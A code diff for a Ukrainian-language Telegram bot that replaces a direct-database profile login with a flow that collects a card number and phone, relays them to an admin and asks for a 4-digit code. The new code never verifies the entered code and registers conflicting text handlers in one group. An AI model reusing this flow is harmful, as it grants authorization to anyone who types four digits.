@@ -1,7 +1,5 @@
 # modules/handlers/profile.py
-
 import re
-import sqlite3
 from telegram import Update
 from telegram.ext import (
     CallbackQueryHandler,
@@ -9,60 +7,53 @@ from telegram.ext import (
     filters,
     ContextTypes,
 )
-from modules.config import ADMIN_ID, DB_NAME
-from keyboards import nav_buttons, client_menu, main_menu
-from states import (
+from modules.config import ADMIN_ID
+from db               import get_user, upsert_user
+from keyboards        import nav_buttons, client_menu
+from states           import (
     STEP_MENU,
     STEP_PROFILE_ENTER_CARD,
     STEP_PROFILE_ENTER_PHONE,
+    STEP_PROFILE_ENTER_CODE,
 )
 
 def register_profile_handlers(app):
-    # 1) Вхід у профіль / перевірка авторизації
+    # «Мій профіль»
     app.add_handler(
         CallbackQueryHandler(_enter_profile, pattern="^client_profile$"),
-        group=0,
+        group=0
     )
-    # 2) Обробник logout
-    app.add_handler(
-        CallbackQueryHandler(profile_logout, pattern="^logout$"),
-        group=1,
-    )
-    # 3) Введення картки (група 2)
+    # введення картки
     app.add_handler(
         MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_card),
-        group=2,
+        group=1
     )
-    # 4) Введення телефону (група 3)
+    # введення телефону
     app.add_handler(
         MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_phone),
-        group=3,
+        group=1
+    )
+    # введення SMS-коду
+    app.add_handler(
+        MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_code),
+        group=1
     )
 
 async def _enter_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Кнопка 'Мій профіль': показуємо меню або починаємо авторизацію."""
+    """Перша точка входу в профіль."""
     query = update.callback_query
     await query.answer()
-    user_id = query.from_user.id
 
-    # Дістаємо користувача з БД
-    with sqlite3.connect(DB_NAME) as conn:
-        row = conn.execute(
-            "SELECT card, is_authorized FROM users WHERE user_id = ?",
-            (user_id,)
-        ).fetchone()
-
-    # Якщо є і вже авторизований — показуємо меню профілю
-    if row and row[1] == 1:
+    user = get_user(query.from_user.id)
+    if user:
+        # вже авторизований
         await query.message.reply_text(
-            "Вітаємо в особистому кабінеті!",
+            "Ви вже авторизовані!",
             reply_markup=client_menu(authorized=True)
         )
         return STEP_MENU
 
-    # Інакше — починаємо нову авторизацію
-    # Чистимо попередні дані
-    context.user_data.pop("profile_card", None)
+    # новий користувач → просимо картку
     await query.message.reply_text(
         "Будь ласка, введіть номер вашої картки:",
         reply_markup=nav_buttons()
@@ -70,100 +61,77 @@ async def _enter_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return STEP_PROFILE_ENTER_CARD
 
 async def profile_enter_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обробка вводу картки (4–7 цифр)."""
-    # Якщо вже авторизований — ігноруємо
-    user_id = update.effective_user.id
-    with sqlite3.connect(DB_NAME) as conn:
-        auth = conn.execute(
-            "SELECT is_authorized FROM users WHERE user_id = ?", (user_id,)
-        ).fetchone()
-    if auth and auth[0] == 1:
-        return
-
-    text = update.message.text or ""
-    card = re.sub(r"\D", "", text)
-
-    if not (4 <= len(card) <= 7):
+    text = re.sub(r"\D", "", update.message.text)  # лиш цифри
+    if not (4 <= len(text) <= 7):
         await update.message.reply_text(
-            "Невірний формат картки. Має бути від 4 до 7 цифр, без літер та пробілів.",
+            "Невірний формат картки. Має бути від 4 до 7 цифр.",
             reply_markup=nav_buttons()
         )
         return STEP_PROFILE_ENTER_CARD
 
-    context.user_data["profile_card"] = card
+    context.user_data["profile_card"] = text
     await update.message.reply_text(
-        "Дякую! Тепер введіть номер телефону (повинен починатися з 0 та містити 10 цифр):",
+        "Дякую! Тепер введіть номер телефону (починається з 0, 10 цифр):",
         reply_markup=nav_buttons()
     )
     return STEP_PROFILE_ENTER_PHONE
 
 async def profile_enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обробка вводу телефону, запис у БД і завершення авторизації."""
-    # Перевіряємо, що ми в процесі авторизації
-    if "profile_card" not in context.user_data:
-        return await _enter_profile(update, context)
-
-    text = update.message.text or ""
-    phone = re.sub(r"\D", "", text)
-
-    if not re.fullmatch(r"0\d{9}", phone):
+    phone = re.sub(r"\D", "", update.message.text)
+    if not (phone.startswith("0") and len(phone) == 10):
         await update.message.reply_text(
-            "Невірний формат телефону. Має бути 10 цифр, починаючи з 0.",
+            "Невірний формат телефону. Має починатися з 0 і бути 10 цифр.",
             reply_markup=nav_buttons()
         )
         return STEP_PROFILE_ENTER_PHONE
 
-    card = context.user_data["profile_card"]
-    user_id = update.effective_user.id
+    context.user_data["profile_phone"] = phone
 
-    # Записуємо в БД (створюємо/оновлюємо користувача)
-    with sqlite3.connect(DB_NAME) as conn:
-        conn.execute("""
-            CREATE TABLE IF NOT EXISTS users (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER UNIQUE,
-                card TEXT,
-                phone TEXT,
-                is_authorized INTEGER DEFAULT 0
-            )
-        """)
-        conn.execute("""
-            INSERT INTO users(user_id, card, phone, is_authorized)
-            VALUES (?, ?, ?, 1)
-            ON CONFLICT(user_id) DO UPDATE SET
-                card=excluded.card,
-                phone=excluded.phone,
-                is_authorized=1
-        """, (user_id, card, phone))
-        conn.commit()
-
-    # Очищуємо тимчасові дані
-    context.user_data.clear()
+    # повідомити адміністратору
+    name = update.effective_user.full_name
+    await context.bot.send_message(
+        ADMIN_ID,
+        f"Запит на авторизацію від {name} ({update.effective_user.id}):\n"
+        f"Картка: {context.user_data['profile_card']}\n"
+        f"Телефон: {phone}\n\n"
+        "Відправте клієнту 4-значний код."
+    )
 
     await update.message.reply_text(
-        "Ви успішно авторизовані! Ось ваше меню:",
-        reply_markup=client_menu(authorized=True)
+        "Код надіслано адміністратору. Введіть 4-значний код:",
+        reply_markup=nav_buttons()
     )
-    return STEP_MENU
+    return STEP_PROFILE_ENTER_CODE
 
-async def profile_logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обробка кнопки 'Вийти' — знімаємо авторизацію й повертаємо в головне меню."""
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-
-    # Оновлюємо БД
-    with sqlite3.connect(DB_NAME) as conn:
-        conn.execute(
-            "UPDATE users SET is_authorized = 0 WHERE user_id = ?",
-            (user_id,)
+async def profile_enter_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    code = re.sub(r"\D", "", update.message.text)
+    if len(code) != 4:
+        await update.message.reply_text(
+            "Невірний код. Має бути 4 цифри.",
+            reply_markup=nav_buttons()
         )
-        conn.commit()
+        return STEP_PROFILE_ENTER_CODE
 
-    # Чистимо контекст та повертаємо в головне меню
-    context.user_data.clear()
-    await query.message.reply_text(
-        "Ви вийшли з профілю.",
-        reply_markup=main_menu(is_admin=False)
+    # адміну – отриманий код
+    name = update.effective_user.full_name
+    await context.bot.send_message(
+        ADMIN_ID,
+        f"Код від {name} ({update.effective_user.id}): {code}"
+    )
+
+    # зберегти в БД
+    upsert_user(
+        update.effective_user.id,
+        context.user_data["profile_card"],
+        context.user_data["profile_phone"]
+    )
+
+    # очистити тимчасові
+    context.user_data.pop("profile_card", None)
+    context.user_data.pop("profile_phone", None)
+
+    await update.message.reply_text(
+        "Ви успішно авторизовані!",
+        reply_markup=client_menu(authorized=True)
     )
     return STEP_MENU
